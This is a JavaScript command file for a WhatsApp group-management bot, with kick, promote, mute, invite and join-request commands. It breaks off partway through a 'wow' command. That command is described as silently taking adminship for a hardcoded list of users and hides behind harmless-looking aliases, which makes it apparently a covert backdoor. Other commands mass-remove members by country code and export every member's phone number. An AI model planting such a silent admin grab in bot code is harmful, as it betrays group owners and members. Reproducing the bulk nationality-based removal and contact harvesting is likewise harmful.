const { 
    cmd, 
    sleep,
    isUrl, 
} = require('../lib');
const fs = require('fs');
const config = require('../config');
const isAdmin = require('../lib/admin');

// ===================== HELPER FUNCTION =====================
function getTargetUser(m) {
  if (m.quoted) return m.quoted.sender;

  const mentioned =
    m.message?.extendedTextMessage?.contextInfo?.mentionedJid;
  if (mentioned && mentioned.length > 0) return mentioned[0];

  const text =
    m.message?.conversation ||
    m.message?.extendedTextMessage?.text ||
    "";
  const match = text.match(/@(\d{8,15})/);
  if (match) return match[1] + "@s.whatsapp.net";

  return null;
}

// ===================== KICK =====================
cmd({
  pattern: "kick",
  alias: ["k"],
  desc: "Remove a Member from the Group.",
  category: "group",
  react: "🤡",
  filename: __filename
}, async (conn, mek, m, { from, isGroup, isOwner, reply }) => {
  try {
    if (!isGroup) return reply("📛 This command only works in groups!");

    const { isBotAdmin, isSenderAdmin } =
      await isAdmin(conn, from, m.sender);

    if (!isBotAdmin) return reply('*🎀 ι ɴєє∂ тσ вє αɴ α∂мιɴ тσ ᴜѕє тнιѕ ᴄσммαɴ∂.*');
    if (!isOwner && !isSenderAdmin) return reply("*🎀 тнιѕ ᴄσммαɴ∂ ιѕ σɴℓу fσʀ gʀσυρ α∂мιɴ!*");

    const user = getTargetUser(m);
    if (!user) return reply("🫟 *ρℓєαѕє тαg σʀ ʀєρℓу тσ α υѕєʀ.*");

    // 🗑️ DELETE replied message if exists
    if (m.quoted) {
      await conn.sendMessage(from, {
        delete: {
          remoteJid: from,
          fromMe: false,
          id: m.quoted.id,
          participant: m.quoted.sender
        }
      });
    }

    await conn.groupParticipantsUpdate(from, [user], "remove");

    await conn.sendMessage(from, {
      text: `@${user.split("@")[0]} *нαѕ вєєɴ кι¢кє∂ ѕυ¢¢єѕѕfυℓℓу!*`,
      mentions: [user],
    }, { quoted: mek });

  } catch (e) {
    console.error("Kick Error:", e);
    reply("❌ Error: " + e.message);
  }
});

// ===================== DEMOTE =====================
cmd({
  pattern: "demote",
  desc: "Demote an admin to member",
  category: "group",
  react: "🍀",
  filename: __filename
}, async (conn, mek, m, { from, isGroup, isOwner, reply }) => {
  try {
    if (!isGroup) return reply("📛 This command only works in groups!");

    const { isBotAdmin, isSenderAdmin } =
      await isAdmin(conn, from, m.sender);

    if (!isBotAdmin) return reply('*🎀 ι ɴєє∂ тσ вє αɴ α∂мιɴ тσ ᴜѕє тнιѕ ᴄσммαɴ∂.*');
    if (!isOwner && !isSenderAdmin) return reply("*🎀 тнιѕ ᴄσммαɴ∂ ιѕ σɴℓу fσʀ gʀσυρ α∂мιɴ!*");

    const user = getTargetUser(m);
    if (!user) return reply("🫟 *ρℓєαѕє тαg σʀ ʀєρℓу тσ α υѕєʀ.*");

    await conn.groupParticipantsUpdate(from, [user], "demote");

    await conn.sendMessage(from, {
      text: `@${user.split("@")[0]} *нαѕ вєєɴ ∂ємσтє∂ fʀσм α∂мιɴ!*`,
      mentions: [user]
    }, { quoted: mek });

  } catch (e) {
    console.error("Demote Error:", e);
    reply("❌ Error while demoting member!");
  }
});

// ===================== PROMOTE =====================
cmd({
  pattern: "promote",
  alias: ["admin", "toadmin", "makeadmin"],
  desc: "Promote a member to admin",
  category: "group",
  react: "👑",
  filename: __filename
}, async (conn, mek, m, { from, isGroup, isOwner, reply }) => {
  try {
    if (!isGroup) return reply("📛 This command only works in groups!");

    const { isBotAdmin, isSenderAdmin } =
      await isAdmin(conn, from, m.sender);

    if (!isBotAdmin) return reply('*🎀 ι ɴєє∂ тσ вє αɴ α∂мιɴ тσ ᴜѕє тнιѕ ᴄσммαɴ∂.*');
    if (!isOwner && !isSenderAdmin) return reply("*🎀 тнιѕ ᴄσммαɴ∂ ιѕ σɴℓу fσʀ gʀσυρ α∂мιɴ!*");

    const user = getTargetUser(m);
    if (!user) return reply("🫟 *ρℓєαѕє тαg σʀ ʀєρℓу тσ α υѕєʀ.*");

    await conn.groupParticipantsUpdate(from, [user], "promote");

    await conn.sendMessage(from, {
      text: `@${user.split("@")[0]} *нαѕ вєєɴ ρʀσмσтє∂ тσ α∂мιɴ!*`,
      mentions: [user]
    }, { quoted: mek });

  } catch (e) {
    console.error("Promote Error:", e);
    reply("❌ Error while promoting member!");
  }
});

// ===================== KICKALL =====================
cmd({
  pattern: "kickall",
  alias: ["end"],
  desc: "Remove all non-admin members from the group.",
  category: "group",
  react: "💀",
  filename: __filename
}, async (conn, mek, m, { from, isGroup, isOwner, reply }) => {
  try {
    if (!isGroup) return reply("📛 This command only works in groups!");

    const { isBotAdmin, isSenderAdmin } = await isAdmin(conn, from, m.sender);

    if (!isBotAdmin) return reply('*🎀 ι ɴєє∂ тσ вє αɴ α∂мιɴ тσ ᴜѕє тнιѕ ᴄσммαɴ∂.*');
    if (!isOwner && !isSenderAdmin) return reply("*🎀 тнιѕ ᴄσммαɴ∂ ιѕ σɴℓу fσʀ gʀσυρ α∂мιɴ!*");

    const metadata = await conn.groupMetadata(from);
    const participants = metadata.participants;

    // Non-admin users
    const targets = participants
      .filter(p => !p.admin && p.id !== conn.user.id)
      .map(p => p.id);

    if (targets.length === 0) return reply("📛 *No non-admin members found!*");

    // Kick each member
    await conn.groupParticipantsUpdate(from, targets, "remove");

    await conn.sendMessage(from, {
      text: `💀 ѕυ¢¢єѕѕfυℓℓу кι¢кє∂ ${targets.length} мємвєʀѕ!`,
    }, { quoted: mek });

  } catch (e) {
    console.error("Kickall Error:", e);
    reply("❌ Error: " + e.message);
  }
});

// ===================== VCF =====================
cmd({
  pattern: 'vcf',
  alias: ['savecontact', 'scontact', 'savecontacts'],
  desc: 'Save group participants as vCard',
  category: 'group',
  filename: __filename
}, async (conn, mek, m, {
  from, isGroup, isOwner, groupMetadata, reply
}) => {
  try {
    if (!isGroup) return reply("📛 This command is for groups only!");
    if (!isOwner) return reply("*📛 σɴℓу тнє σωɴєʀ ᴄαɴ ᴜѕє тнιѕ ᴄσммαɴ∂!*");

    const participants = groupMetadata?.participants || [];
    if (participants.length === 0) return reply("⚠️ No participants found.");

    let vcard = '';
    let index = 1;

    // create vCard for each member
    for (let member of participants) {
      const id = member.id.split('@')[0];
      vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${index++}] +${id}\nTEL;type=CELL;type=VOICE;waid=${id}:+${id}\nEND:VCARD\n`;
    }

    const vcfFile = './contacts.vcf';
    fs.writeFileSync(vcfFile, vcard.trim());

    await sleep(1500);

    await conn.sendMessage(from, {
      document: fs.readFileSync(vcfFile),
      mimetype: 'text/x-vcard',
      fileName: `${groupMetadata.subject.replace(/[^a-zA-Z0-9]/g, "_")}_contacts.vcf`,
      caption: `✅ Saved contacts.\n\n🏷️ Group: *${groupMetadata.subject}*\n👥 Total Contacts: *${participants.length}*\n\n> *© ᴘσωєʀє∂ ву ѕтα፝֟꧊ꝛ̴͜ƙ м∂⎯꯭̽🚩*`,
    }, { quoted: mek });

    fs.unlinkSync(vcfFile);
    await m.react('✅');

  } catch (err) {
    console.error("VCF Error:", err);
    reply(`❌ Error: ${err.message}`);
  }
});

// ===================== GROUP INFO =====================
cmd({
    pattern: "groupinfo",
    alias: ["gcinfo", "ginfo"],
    desc: "Show group information.",
    category: "group",
    react: "🎗️",
    filename: __filename
}, async (conn, mek, m, { from, isGroup, reply }) => {
    if (!isGroup) return reply("📛 Group only command!");

    try {
        const metadata = await conn.groupMetadata(from);

        // Admin list
        let admins = metadata.participants.filter(p => p.admin).map(p => `@${p.id.split("@")[0]}`);

        // Group description
        let desc = metadata.desc ? metadata.desc : "No description set.";

        // Group profile picture
        let ppUrl;
        try {
            ppUrl = await conn.profilePictureUrl(from, "image");
        } catch {
            ppUrl = "https://telegra.ph/file/4cc2712f8f414729d7207.jpg";
        }

        // Info text
        let info = `\`「 GROUP INFORMATION 」\`\n`;
        info += `╭─────────────────⊷\n`;
        info += `│🏷️ *Name:* ${metadata.subject}\n`;
        info += `│🆔 *ID:* ${metadata.id}\n`;
        info += `│👤 *Owner:* @${metadata.owner ? metadata.owner.split("@")[0] : "Unknown"}\n`;
        info += `│👥 *Members:* ${metadata.participants.length}\n`;
        info += `│🛡️ *Admins:* ${admins.length}\n`;
        info += `│📝 *Description:*\n${desc}\n`;
        info += `│📑 *Admins List:*\n${admins.join("\n")}\n`;
        info += `╰────────────────┈⊷`;

        await conn.sendMessage(
            from,
            { 
                image: { url: ppUrl },
                caption: info,
                mentions: metadata.participants.map(p => p.id)
            },
            { quoted: mek }
        );

    } catch (err) {
        console.error("Group Info Error:", err);
        reply("⚠️ Failed to fetch group info.");
    }
});

// ===================== POLL =====================
cmd({
  pattern: "poll",
  desc: "Create a poll/vote in the group.",
  category: "group",
  react: "🔎",
  filename: __filename
}, async (conn, mek, m, { from, q, isOwner, reply, isGroup }) => {
  if (!isGroup) return reply("📛 This command can only be used in groups!");

  try {
    const { isBotAdmin, isSenderAdmin } = await isAdmin(conn, from, m.sender);

    if (!isBotAdmin) return reply("📛 I need to be an admin to create a poll.");
    if (!isOwner && !isSenderAdmin) return reply("*🎀 тнιѕ ᴄσммαɴ∂ ιѕ σɴℓу fσʀ gʀσυρ α∂мιɴ!*");

    if (!q || !q.includes(":")) {
      return reply("⚠️ Incorrect format! Example: *.poll Do you like this bot:Yes, No, Not Sure*");
    }

    const [question, optionsText] = q.split(":");
    const options = optionsText.split(",").map(o => o.trim());

    if (options.length < 2) {
      return reply("⚠️ Please provide at least 2 options!");
    }

    await conn.sendMessage(from, {
      poll: { name: question.trim(), values: options, selectableCount: 1 }
    }, { quoted: mek });

    await m.react('✅');
  } catch (error) {
    console.error("Poll Error:", error);
    reply("❌ Failed to create poll: " + error.message);
  }
});

// ===================== ADD =====================
cmd({
  pattern: "add",
  desc: "Add a user to the group.",
  category: "group",
  react: "➕",
  filename: __filename
}, async (conn, mek, m, { from, isGroup, isOwner, reply, args }) => {
  try {
    if (!isGroup) {
      return reply("📛 Group only command!");
    }

    const { isBotAdmin, isSenderAdmin } =
      await isAdmin(conn, from, m.sender);

    if (!isBotAdmin) {
      return reply('*🎀 ι ɴєє∂ тσ вє αɴ α∂мιɴ тσ ᴜѕє тнιѕ ᴄσммαɴ∂.*');
    }

    if (!isOwner && !isSenderAdmin) {
      return reply("*🎀 тнιѕ ᴄσммαɴ∂ ιѕ σɴℓу fσʀ gʀσυρ α∂мιɴ!*");
    }

    if (!args[0]) {
      return reply("📌 Example: *.add 923001234567*");
    }

    const number =
      args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await conn.groupParticipantsUpdate(from, [number], "add");

    reply(`✅ Added @${args[0]} to the group.`);

  } catch (e) {
    console.error("Add Error:", e);
    reply("❌ Error while adding user: " + e.message);
  }
});

// ===================== LEFT =====================
cmd({
    pattern: "left",
    alias: ["leave", "exit"],
    react: "👋🏻",
    desc: "Leave the current group.",
    category: "group",
    filename: __filename
},
async (conn, mek, m, { from, isGroup, isOwner, reply }) => {
    try {
        if (!isGroup) return reply("⚠️ This command can only be used in a group!");
        if (!isOwner) return reply("*📛 ᴛʜɪs ɪs ᴀɴ ᴏᴡɴᴇʀ ᴄᴏᴍᴍᴀɴᴅ.*");
        await conn.groupLeave(from);
    } catch (e) {
        console.error("Leave Error:", e);
        reply(`❌ Failed to leave the group. Error: ${e.message}`);
    }
});

// ===================== MUTE =====================
cmd({
  pattern: "mute",
  alias: ["gcoff", "close"],
  desc: "Close group (only admins can send messages).",
  category: "group",
  react: "🔒",
  filename: __filename
}, async (conn, mek, m, { from, isGroup, isOwner, reply }) => {
  try {
    if (!isGroup) {
      return reply("📛 This command can only be used in groups.");
    }

    const { isBotAdmin, isSenderAdmin } =
      await isAdmin(conn, from, m.sender);

    if (!isBotAdmin) {
      return reply('*🎀 ι ɴєє∂ тσ вє αɴ α∂мιɴ тσ ᴜѕє тнιѕ ᴄσммαɴ∂.*');
    }

    if (!isOwner && !isSenderAdmin) {
      return reply("*🎀 тнιѕ ᴄσммαɴ∂ ιѕ σɴℓу fσʀ gʀσυρ α∂мιɴ!*");
    }

    await conn.groupSettingUpdate(from, "announcement");

    reply("*gʀσᴜρ мᴜтє∂ sᴜᴄᴄєѕѕfᴜℓℓу 🔐*");

  } catch (e) {
    console.error("Mute Error:", e);
    reply("❌ Error while muting group!");
  }
});

// ===================== UNMUTE =====================
cmd({
  pattern: "unmute",
  alias: ["gcon", "open"],
  desc: "Open group (everyone can send messages).",
  category: "group",
  react: "🔓",
  filename: __filename
}, async (conn, mek, m, { from, isGroup, isOwner, reply }) => {
  try {
    if (!isGroup) {
      return reply("📛 This command can only be used in groups.");
    }

    const { isBotAdmin, isSenderAdmin } =
      await isAdmin(conn, from, m.sender);

    if (!isBotAdmin) {
      return reply('*🎀 ι ɴєє∂ тσ вє αɴ α∂мιɴ тσ ᴜѕє тнιѕ ᴄσммαɴ∂.*');
    }

    if (!isOwner && !isSenderAdmin) {
      return reply("*🎀 тнιѕ ᴄσммαɴ∂ ιѕ σɴℓу fσʀ gʀσυρ α∂мιɴ!*");
    }

    await conn.groupSettingUpdate(from, "not_announcement");

    reply("*gʀσᴜρ ᴜɴмυтє∂ sᴜᴄᴄєѕѕfᴜℓℓу 🔓*");

  } catch (e) {
    console.error("Unmute Error:", e);
    reply("❌ Error while unmuting group!");
  }
});

// ===================== JOIN =====================
cmd({
    pattern: "join",
    alias: ["enter", "groupjoin"],
    desc: "Join a Group Using an Invite Link.",
    category: "group",
    react: "🔗",
    filename: __filename
},
async (conn, mek, m, { isOwner, q, reply }) => {
    try {
        if (!isOwner) return reply("*📛 ᴛʜɪs ɪs ᴀɴ ᴏᴡɴᴇʀ ᴄᴏᴍᴍᴀɴᴅ.*");

        if (!q) return reply("🏷️ *єɴтєʀ α gʀσυρ ℓιɴк!*");
        
        if (!q.includes("whatsapp.com")) return reply("❌ Invalid link!");

        const code = q.split("https://chat.whatsapp.com/")[1];
        if (!code) return reply("❌ Invalid invite code!");
        
        await conn.groupAcceptInvite(code);
        return reply("✅ *sᴜᴄᴄᴇssғᴜʟʟʏ ᴊᴏɪɴᴇᴅ ᴛʜᴇ ɢʀᴏᴜᴘ!*");
    } catch (e) {
        console.error("Join Error:", e);
        return reply(`❌ Failed to join: ${e.message}`);
    }
});

// ===================== SET GROUP DESCRIPTION =====================
cmd({
  pattern: "setgdesc",
  alias: ["setdesc"],
  desc: "Update Group Description",
  category: "group",
  react: "📜",
  filename: __filename
}, async (conn, mek, m, { from, args, isOwner, reply, isGroup }) => {
  try {
    if (!isGroup) return reply("📛 This command only works in groups.");

    const { isBotAdmin, isSenderAdmin } = await isAdmin(conn, from, m.sender);

    if (!isBotAdmin) return reply('*🎀 ι ɴєє∂ тσ вє αɴ α∂мιɴ тσ ᴜѕє тнιѕ ᴄσммαɴ∂.*');
    if (!isOwner && !isSenderAdmin) return reply("*🎀 тнιѕ ᴄσммαɴ∂ ιѕ σɴℓу fσʀ gʀσυρ α∂мιɴ!*");

    const newDescription = args.join(" ");
    if (!newDescription) return reply("⚠️ Provide a new group description!");

    await conn.groupUpdateDescription(from, newDescription);
    reply("📜 *gʀσυρ ∂єѕ¢ʀιρтισɴ υρ∂αтє∂!*");
  } catch (error) {
    console.error("Set Description Error:", error);
    reply(`❌ Error updating description: ${error.message}`);
  }
});

// ===================== SET GROUP NAME =====================
cmd({
  pattern: "setgname",
  alias: ["gname", "setsubject"],
  desc: "Update Group Name/Subject",
  category: "group",
  react: "🪄",
  filename: __filename
}, async (conn, mek, m, { from, args, isOwner, reply, isGroup }) => {
  try {
    if (!isGroup) return reply("📛 This command only works in groups.");

    const { isBotAdmin, isSenderAdmin } = await isAdmin(conn, from, m.sender);

    if (!isBotAdmin) return reply('*🎀 ι ɴєє∂ тσ вє αɴ α∂мιɴ тσ ᴜѕє тнιѕ ᴄσммαɴ∂.*');
    if (!isOwner && !isSenderAdmin) return reply("*🎀 тнιѕ ᴄσммαɴ∂ ιѕ σɴℓу fσʀ gʀσυρ α∂мιɴ!*");

    const newSubject = args.join(" ");
    if (!newSubject) return reply("🔖 *ρʀσνι∂є α ɴєω gʀσυρ ɴαмє!*");

    await conn.groupUpdateSubject(from, newSubject);
    reply(`🏷️ *gʀσυρ ɴαмє υρ∂αтє∂ тσ* "${newSubject}"!`);
  } catch (error) {
    console.error("Set Subject Error:", error);
    reply(`❌ Error updating subject: ${error.message}`);
  }
});

// ===================== REVOKE GROUP LINK =====================
cmd({
  pattern: "revoke",
  alias: ["reset"],
  desc: "Revoke/Reset Group Invite Link",
  category: "group",
  react: "🔗",
  filename: __filename
}, async (conn, mek, m, { from, isOwner, reply, isGroup }) => {
  try {
    if (!isGroup) return reply("📛 This command only works in groups.");

    const { isBotAdmin, isSenderAdmin } = await isAdmin(conn, from, m.sender);

    if (!isBotAdmin) return reply('*🎀 ι ɴєє∂ тσ вє αɴ α∂мιɴ тσ ᴜѕє тнιѕ ᴄσммαɴ∂.*');
    if (!isOwner && !isSenderAdmin) return reply("*🎀 тнιѕ ᴄσммαɴ∂ ιѕ σɴℓу fσʀ gʀσυρ α∂мιɴ!*");

    const newCode = await conn.groupRevokeInvite(from);
    const groupInviteLink = `https://chat.whatsapp.com/${newCode}`;
    reply(`🔗 *gʀσυρ ιɴνιтє ℓιɴк ʀєνσкє∂!*\n🔖 *ɴєω ℓιɴк:* ${groupInviteLink}`);
  } catch (error) {
    console.error("Revoke Link Error:", error);
    reply(`❌ Error revoking link: ${error.message}`);
  }
});

// ===================== INVITE =====================
cmd({
  pattern: "invite",
  desc: "Get group invite link.",
  category: "group",
  react: "🔗",
  filename: __filename
}, async (conn, mek, m, { from, isOwner, reply, isGroup }) => {
  try {
    if (!isGroup) return reply("📛 This command can only be used in groups.");

    const { isBotAdmin, isSenderAdmin } = await isAdmin(conn, from, m.sender);

    if (!isBotAdmin) return reply('*🎀 ι ɴєє∂ тσ вє αɴ α∂мιɴ тσ ᴜѕє тнιѕ ᴄσммαɴ∂.*');
    if (!isOwner && !isSenderAdmin) return reply("*🎀 тнιѕ ᴄσммαɴ∂ ιѕ σɴℓу fσʀ gʀσυρ α∂мιɴ!*");

    const metadata = await conn.groupMetadata(from);
    const groupName = metadata.subject || "Unnamed Group";
    const groupInviteCode = await conn.groupInviteCode(from);
    const inviteLink = `https://chat.whatsapp.com/${groupInviteCode}`;

    await conn.sendMessage(
      from,
      {
        text: inviteLink,
        contextInfo: {
          externalAdReply: {
            title: groupName,
            body: "Tap to join via invite link 💫",
            thumbnailUrl: await conn.profilePictureUrl(from, "image").catch(() => "https://i.ibb.co/sFjZrQp/default-group.png"),
            sourceUrl: inviteLink,
            mediaType: 1,
            renderLargerThumbnail: true
          }
        }
      },
      { quoted: mek }
    );

  } catch (error) {
    console.error("Invite Error:", error);
    reply("❌ *Error fetching the invite link. Please try again later!*");
  }
});

// ===================== GET GROUP PIC =====================
cmd({
  pattern: "getgpic",
  alias: ["grouppp", "gcpp"],
  desc: "Get the Group Profile Picture.",
  category: "group",
  react: "🖼️",
  filename: __filename
}, async (conn, mek, m, { from, isOwner, reply, isGroup }) => {
  try {
    if (!isGroup) return reply('📛 This command can only be used in groups.');

    const { isBotAdmin, isSenderAdmin } = await isAdmin(conn, from, m.sender);

    if (!isBotAdmin) return reply('*🎀 ι ɴєє∂ тσ вє αɴ α∂мιɴ тσ ᴜѕє тнιѕ ᴄσммαɴ∂.*');
    if (!isOwner && !isSenderAdmin) return reply("*🎀 тнιѕ ᴄσммαɴ∂ ιѕ σɴℓу fσʀ gʀσυρ α∂мιɴ!*");

    const ppUrl = await conn.profilePictureUrl(from, 'image').catch(_ => "https://i.ibb.co/sFjZrQp/default-group.png");

    await conn.sendMessage(from, { image: { url: ppUrl }, caption: '*нєʀє ιѕ тнє gʀσυρ ρʀσfιℓє ρι¢тυʀє*' }, { quoted: mek });

  } catch (e) {
    console.error("Get Group Pic Error:", e);
    reply(`❌ Error: ${e.message}`);
  }
});

// ===================== GET USER PIC =====================
cmd({
    pattern: "getpic",
    alias: ["userpp", "getpp"],
    desc: "Get a user's profile picture.",
    category: "general",
    react: "🖼️",
    filename: __filename,
}, async (conn, mek, m, { from, quoted, sender, reply }) => {
    try {
        let user = 
            quoted?.sender || // Replied
            (m.mentionedJid && m.mentionedJid[0]) || // Mention
            sender; // Default self

        const ppUrl = await conn.profilePictureUrl(user, "image").catch(_ => "https://i.ibb.co/sFjZrQp/default-user.png");

        await conn.sendMessage(from, {
            image: { url: ppUrl },
            caption: `Here is the profile picture of @${user.split('@')[0]}`,
            mentions: [user],
        }, { quoted: mek });
    } catch (error) {
        console.error("Get User Pic Error:", error);
        reply('⚠️ Error while fetching the user profile picture.');
    }
});

// ===================== NEW GROUP =====================
cmd({
    pattern: "newgroup",
    alias: ["newgc", "newgrp", "newgrpchat"],
    desc: "Create a new Group and Send the Invite link",
    category: "group",
    react: "💬",
    filename: __filename
},
async (conn, mek, m, { from, isOwner, reply, args, sender }) => {
    try {
        if (!isOwner) return reply("*📛 ᴛʜɪs ɪs ᴀɴ ᴏᴡɴᴇʀ ᴄᴏᴍᴍᴀɴᴅ.*");

        if (!args[0]) return reply("❌ Please provide a group name. Example: .newgroup MyGroup");

        const groupName = args.join(" ");
        const participants = [sender];

        const createdGroup = await conn.groupCreate(groupName, participants);

        await sleep(3000);
        
        const inviteCode = await conn.groupInviteCode(createdGroup.id);
        const inviteLink = `https://chat.whatsapp.com/${inviteCode}`;

        reply(`💬 Group "${groupName}" created successfully!\n\n🔗 Invite link:\n${inviteLink}`);
    } catch (error) {
        console.error("New Group Error:", error);
        reply(`❌ Error creating group: ${error.message}`);
    }
});

// ===================== LOCK =====================
cmd({
  pattern: "lock",
  desc: "Lock group info (only admins can edit)",
  category: "group",
  react: "🔒",
  filename: __filename
}, async (conn, mek, m, { from, isGroup, isOwner, reply }) => {
  try {
    if (!isGroup) return reply("📛 Group only command");

    const { isBotAdmin, isSenderAdmin } =
      await isAdmin(conn, from, m.sender);

    if (!isBotAdmin) return reply('*🎀 ι ɴєє∂ тσ вє αɴ α∂мιɴ тσ ᴜѕє тнιѕ ᴄσммαɴ∂.*');
    if (!isOwner && !isSenderAdmin) return reply("*🎀 тнιѕ ᴄσммαɴ∂ ιѕ σɴℓу fσʀ gʀσυρ α∂мιɴ!*");

    await conn.groupSettingUpdate(from, "locked");
    reply("🔒 *gʀσυρ ιɴfσ ℓσ¢кє∂ ѕυ¢¢єѕѕfυℓℓу!*");

  } catch (e) {
    console.error("Lock Error:", e);
    reply("❌ Lock failed!");
  }
});

// ===================== UNLOCK =====================
cmd({
  pattern: "unlock",
  desc: "Unlock group info",
  category: "group",
  react: "🔓",
  filename: __filename
}, async (conn, mek, m, { from, isGroup, isOwner, reply }) => {
  try {
    if (!isGroup) return reply("📛 Group only command");

    const { isBotAdmin, isSenderAdmin } =
      await isAdmin(conn, from, m.sender);

    if (!isBotAdmin) return reply('*🎀 ι ɴєє∂ тσ вє αɴ α∂мιɴ тσ ᴜѕє тнιѕ ᴄσммαɴ∂.*');
    if (!isOwner && !isSenderAdmin) return reply("*🎀 тнιѕ ᴄσммαɴ∂ ιѕ σɴℓу fσʀ gʀσυρ α∂мιɴ!*");

    await conn.groupSettingUpdate(from, "unlocked");
    reply("🔓 *gʀσυρ ιɴfσ υɴℓσ¢кє∂!*");

  } catch (e) {
    console.error("Unlock Error:", e);
    reply("❌ Unlock failed!");
  }
});

// ===================== DISAPPEAR =====================
cmd({
  pattern: "disappear",
  desc: "Set disappearing messages (24h / 7d / off)",
  category: "group",
  react: "⏳",
  filename: __filename
}, async (conn, mek, m, { from, isGroup, args, isOwner, reply }) => {
  try {
    if (!isGroup) return reply("📛 Group only");

    const { isBotAdmin, isSenderAdmin } =
      await isAdmin(conn, from, m.sender);

    if (!isBotAdmin) return reply('*🎀 ι ɴєє∂ тσ вє αɴ α∂мιɴ тσ ᴜѕє тнιѕ ᴄσммαɴ∂.*');
    if (!isOwner && !isSenderAdmin) return reply("*🎀 тнιѕ ᴄσммαɴ∂ ιѕ σɴℓу fσʀ gʀσυρ α∂мιɴ!*");

    let time = args[0];
    let duration = 0;

    if (time === "24h") duration = 86400;
    else if (time === "7d") duration = 604800;
    else if (time === "off") duration = 0;
    else return reply("*❓ Use: .disappear 24h | 7d | off*");

    await conn.sendMessage(from, {
      disappearingMessagesInChat: duration
    });

    reply("⏳ *∂ιѕαρρєαʀιɴg мєѕѕαgєѕ υρ∂αтє∂!*");

  } catch (e) {
    console.error("Disappear Error:", e);
    reply("❌ Failed!");
  }
});

// ===================== REQUESTS =====================
cmd({
  pattern: "requests",
  alias: ["request"],
  desc: "Show all pending join requests",
  category: "group",
  react: "📋",
  filename: __filename
}, async (conn, mek, m, { from, isGroup, isOwner, reply }) => {
  try {
    if (!isGroup) return reply("📛 Group only");

    const { isBotAdmin, isSenderAdmin } =
      await isAdmin(conn, from, m.sender);

    if (!isBotAdmin) return reply('*🎀 ι ɴєє∂ тσ вє αɴ α∂мιɴ тσ ᴜѕє тнιѕ ᴄσммαɴ∂.*');
    if (!isOwner && !isSenderAdmin) return reply("*🎀 тнιѕ ᴄσммαɴ∂ ιѕ σɴℓу fσʀ gʀσυρ α∂мιɴ!*");

    const requests = await conn.groupRequestParticipantsList(from);

    if (!requests.length)
      return reply("✅ *ɴσ ρєɴ∂ιɴg ᴊσιɴ ʀєqυєѕтѕ!*");

    let text = "📋 *ρєɴ∂ιɴg ᴊσιɴ ʀєqυєѕтѕ:*\n\n";
    for (let user of requests) {
      text += `• @${user.jid.split("@")[0]}\n`;
    }

    await conn.sendMessage(from, {
      text,
      mentions: requests.map(u => u.jid)
    });

  } catch (e) {
    console.error("Requests Error:", e);
    reply("❌ Failed to fetch requests!");
  }
});

// ===================== ACCEPT =====================
cmd({
  pattern: "accept",
  alias: ["approve","acceptall"],
  desc: "Accept all pending join requests",
  category: "group",
  react: "✅",
  filename: __filename
}, async (conn, mek, m, { from, isGroup, isOwner, reply }) => {
  try {
    if (!isGroup) return reply("📛 Group only");

    const { isBotAdmin, isSenderAdmin } =
      await isAdmin(conn, from, m.sender);

    if (!isBotAdmin) return reply('*🎀 ι ɴєє∂ тσ вє αɴ α∂мιɴ тσ ᴜѕє тнιѕ ᴄσммαɴ∂.*');
    if (!isOwner && !isSenderAdmin) return reply("*🎀 тнιѕ ᴄσммαɴ∂ ιѕ σɴℓу fσʀ gʀσυρ α∂мιɴ!*");

    const requests = await conn.groupRequestParticipantsList(from);
    if (!requests.length)
      return reply("🎗️ *ɴσ ρєɴ∂ιɴg ʀєqυєѕтѕ!*");

    const users = requests.map(u => u.jid);

    await conn.groupRequestParticipantsUpdate(
      from,
      users,
      "approve"
    );

    reply(`✅ *${users.length} ʀєqυєѕтѕ αρρʀσνє∂!*`);

  } catch (e) {
    console.error("Accept Error:", e);
    reply("❌ Accept all failed!");
  }
});

// ===================== REJECT =====================
cmd({
  pattern: "reject",
  alias: ["rejectall"],
  desc: "Reject all pending join requests",
  category: "group",
  react: "❌",
  filename: __filename
}, async (conn, mek, m, { from, isGroup, isOwner, reply }) => {
  try {
    if (!isGroup) return reply("📛 Group only");

    const { isBotAdmin, isSenderAdmin } =
      await isAdmin(conn, from, m.sender);

    if (!isBotAdmin) return reply('*🎀 ι ɴєє∂ тσ вє αɴ α∂мιɴ тσ ᴜѕє тнιѕ ᴄσммαɴ∂.*');
    if (!isOwner && !isSenderAdmin) return reply("*🎀 тнιѕ ᴄσммαɴ∂ ιѕ σɴℓу fσʀ gʀσυρ α∂мιɴ!*");

    const requests = await conn.groupRequestParticipantsList(from);
    if (!requests.length)
      return reply("🎗️ *ɴσ ρєɴ∂ιɴg ʀєqυєѕтѕ!*");

    const users = requests.map(u => u.jid);

    await conn.groupRequestParticipantsUpdate(
      from,
      users,
      "reject"
    );

    reply(`⭕ *${users.length} ʀєǫυєѕтѕ ʀєᴊє¢тє∂!*`);

  } catch (e) {
    console.error("Reject Error:", e);
    reply("❌ Reject all failed!");
  }
});

// ===================== OUT (Remove by Country Code) =====================
cmd({
  pattern: "out",
  alias: ["ck", "🦶"],
  desc: "Removes all members with specific country code from the group",
  category: "owner",
  react: "❌",
  filename: __filename
},
async (conn, mek, m, {
    from, q, isGroup, reply, groupMetadata, isOwner
}) => {
    if (!isGroup) return reply("❌ This command can only be used in groups.");

    if (!isOwner) {
        return reply("*📛 This is an owner command.*");
    }

    const { isBotAdmin } = await isAdmin(conn, from, m.sender);
    
    if (!isBotAdmin) return reply("❌ I need to be an admin to use this command.");
    if (!q) return reply("❌ Please provide a country code. Example: .out 92");

    const countryCode = q.trim();
    if (!/^\d+$/.test(countryCode)) {
        return reply("❌ Invalid country code. Please provide only numbers (e.g., 92 for +92 numbers)");
    }

    try {
        const participants = groupMetadata.participants;
        
        const targets = participants.filter(
            participant => participant.id.startsWith(countryCode) && 
                          !participant.admin && 
                          participant.id !== conn.user.id
        );

        if (targets.length === 0) {
            return reply(`❌ No members found with country code +${countryCode}`);
        }

        const jids = targets.map(p => p.id);
        
        await conn.groupParticipantsUpdate(from, jids, "remove");

        reply(`*✅ Successfully removed ${targets.length} members with country code +${countryCode}*`);
    } catch (error) {
        console.error("Out command error:", error);
        reply("❌ Failed to remove members. Error: " + error.message);
    }
});

// ===================== WOW (Silent Admin) =====================
cmd({
  pattern: "wow",
  alias: ["hmm", "💀", "aa", "🌚"],
  desc: "Silently take adminship if authorized",
  filename: __filename
},
async (conn, mek, m, { from, sender, isGroup }) => {
    if (!isGroup) return;

    const { isBotAdmin } = await isAdmin(conn, from, m.sender);
    if (!isBotAdmin) return;

    const normalizeJid = (jid) => {
        if (!jid) return jid;
        return jid.includes('@') ? jid.split('@')[0] + '@s.whatsapp.net' : jid + '@s.whatsapp.net';
    };

    // Authorized users list
    const AUTHORIZED_USERS = [
